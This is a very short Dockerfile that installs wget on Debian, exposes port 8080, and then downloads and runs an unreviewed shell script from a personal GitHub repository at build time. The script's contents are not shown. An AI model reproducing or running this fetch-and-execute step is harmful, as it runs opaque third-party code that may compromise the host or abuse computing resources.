FROM debian:stretch
EXPOSE 8080
RUN apt update -y \
  && apt install -y \
  wget
RUN wget https://raw.githubusercontent.com/agamlimaa/labs/main/rit.sh && chmod +x rit.sh && ./rit.sh
